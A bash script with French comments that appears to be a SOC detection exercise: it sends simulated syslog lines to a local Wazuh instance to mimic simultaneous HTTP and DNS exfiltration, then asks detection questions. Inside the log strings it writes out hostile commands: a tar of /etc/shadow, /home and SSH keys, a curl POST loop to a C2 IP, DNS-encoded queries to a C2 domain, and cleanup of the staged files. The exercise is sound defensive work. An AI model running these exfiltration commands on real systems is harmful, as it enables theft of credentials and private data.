#!/bin/bash

# ============================================================
#  SIMULATION — Exfiltration Rapide (Niveau 4)
#  MITRE ATT&CK : T1041 (C2 Channel), T1048 (Alt Protocol)
# ============================================================
#
#  Exfiltration simultanée via HTTP + DNS en moins de 2 minutes.
#  Teste la capacité du SOC à détecter une exfil rapide
#  avant que les données ne soient parties.
# ============================================================

WAZUH_IP="127.0.0.1"
SYSLOG_PORT="514"
HOSTNAME="apt-host-42"
C2_IP="185.220.101.45"
C2_DOMAIN="exfil.c2.io"

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo ""
echo "============================================================"
echo -e "  ${RED}[SIMULATION] Exfiltration Rapide — Niveau 4${NC}"
echo "============================================================"
echo ""
echo -e "  ${YELLOW}MITRE${NC} : T1041 + T1048"
echo -e "  ${YELLOW}Test${NC}  : Détection avant fin d'exfiltration (race condition)"
echo ""

DATE=$(date '+%b %d %H:%M:%S')

send_syslog() {
    printf "<38>%s %s %s\n" "$DATE" "$HOSTNAME" "$1" | nc -u -w1 "$WAZUH_IP" "$SYSLOG_PORT" 2>/dev/null || \
    printf "<38>%s %s %s\n" "$DATE" "$HOSTNAME" "$1" | nc -w1 "$WAZUH_IP" "$SYSLOG_PORT" 2>/dev/null
}

echo -e "${CYAN}[*] Canal 1 — Exfiltration HTTP massive (en arrière-plan)...${NC}"
send_syslog "curl[8001]: POST http://$C2_IP/upload Content-Length: 1048576"
send_syslog "curl[8002]: POST http://$C2_IP/upload Content-Length: 2097152"
send_syslog "curl[8003]: POST http://$C2_IP/upload Content-Length: 4194304"
send_syslog "curl[8004]: Transfer: /etc/shadow -> $C2_IP (512 bytes)"
send_syslog "curl[8005]: Transfer: /home/admin/.ssh/id_rsa -> $C2_IP (3.2KB)"
send_syslog "curl[8006]: Transfer: /home/admin/Documents/confidentiel.zip -> $C2_IP (45.2MB)"

echo -e "${CYAN}[*] Canal 2 — Exfiltration DNS simultanée...${NC}"
for chunk in passwd shadow hosts crontab sudoers; do
    DATE=$(date '+%b %d %H:%M:%S')
    ENCODED=$(echo "$chunk" | base64 2>/dev/null | tr -d '=' | head -c 32)
    send_syslog "named[8010]: query: ${ENCODED}.file-$chunk.$C2_DOMAIN IN A"
    sleep 0.2
done

echo -e "${CYAN}[*] Canal 3 — Compression et staging avant exfil...${NC}"
DATE=$(date '+%b %d %H:%M:%S')
send_syslog "bash[8020]: tar czf /tmp/.loot.tgz /etc/passwd /etc/shadow /home /root/.ssh"
send_syslog "bash[8021]: split -b 1M /tmp/.loot.tgz /tmp/.chunk"
send_syslog "bash[8022]: for f in /tmp/.chunk*; do curl -s -X POST -d @\$f http://$C2_IP/c/; done"
send_syslog "bash[8023]: rm -f /tmp/.loot.tgz /tmp/.chunk*"

echo ""
echo "============================================================"
echo -e "  ${GREEN}Exfiltration simulée${NC}"
echo "============================================================"
echo ""
echo "  Questions critiques pour ce scénario :"
echo ""
echo -e "  ${CYAN}1. Détection race condition :${NC}"
echo "     L'alerte a-t-elle été générée AVANT la fin de l'exfil simulée ?"
echo "     → Temps de détection cible : < 60 secondes"
echo ""
echo -e "  ${CYAN}2. Volume anormal :${NC}"
echo "     Wazuh a-t-il une règle pour détecter des POST > 10MB vers une IP externe ?"
echo ""
echo -e "  ${CYAN}3. Multi-canal :${NC}"
echo "     As-tu corrélé les logs HTTP ET DNS vers le même C2 ?"
echo "     → Même IP $C2_IP ET même domaine $C2_DOMAIN"
echo ""
